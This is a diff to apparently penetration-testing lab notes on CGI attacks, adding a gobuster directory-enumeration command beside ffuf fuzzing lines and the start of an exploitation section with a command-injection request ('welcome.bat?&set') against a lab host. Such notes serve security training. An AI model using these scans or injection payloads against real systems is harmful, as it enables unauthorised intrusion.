@@ -74,6 +74,12 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/F
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
 ```
 
+### Enumeration - Gobuster
+
+```
+gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+
 ### Exploitation 
 ```
 http://10.129.204.227:8080/cgi/welcome.bat?&set
